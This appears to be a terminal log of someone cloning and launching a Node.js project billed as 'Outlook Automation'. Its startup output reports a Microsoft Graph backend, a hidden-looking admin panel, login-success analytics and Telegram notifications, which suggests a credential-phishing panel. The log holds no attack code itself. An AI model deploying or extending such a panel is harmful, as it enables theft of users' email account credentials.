root@sPt1758541624m9B25:~# git clone https://github.com/x8080x2/71n7k.git 71n7k
Cloning into '71n7k'...
remote: Enumerating objects: 2342, done.
remote: Counting objects: 100% (2342/2342), done.
remote: Compressing objects: 100% (796/796), done.
remote: Total 2342 (delta 1404), reused 2342 (delta 1404), pack-reused 0 (from 0)
Receiving objects: 100% (2342/2342), 12.40 MiB | 12.83 MiB/s, done.
Resolving deltas: 100% (1404/1404), done.
root@sPt1758541624m9B25:~# cd 71n7k
root@sPt1758541624m9B25:~/71n7k# chmod +x install.sh
root@sPt1758541624m9B25:~/71n7k# ./install.sh
🚀 Outlook Automation Installation Script
==========================================
⚠️  Please don't run this script as root
root@sPt1758541624m9B25:~/71n7k# npm install
npm warn deprecated har-validator@5.1.5: this library is no longer supported
npm warn deprecated uuid@3.4.0: Please upgrade  to version 7 or higher.  Older versions may use Math.random() in certain circumstances, which is known to be problematic.  See https://v8.dev/blog/math-random for details.
npm warn deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142

added 322 packages, and audited 323 packages in 13s

84 packages are looking for funding
  run `npm fund` for details

6 vulnerabilities (4 moderate, 2 critical)

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
root@sPt1758541624m9B25:~/71n7k# npm start

> workspace@1.0.0 start
> node server.js

✅ Environment variables loaded from .env file
⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled
📊 Loaded analytics from file: { totalLogins: 9, successfulLogins: 18, failedLogins: 13 }
🚀 Microsoft Graph API Backend running on port 5000
📧 API endpoints available at http://localhost:5000/api/
🌐 Frontend available at http://localhost:5000/
🔧 Admin panel available at http://localhost:5000/ad.html
✅ Azure credentials configured - Graph API ready
❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications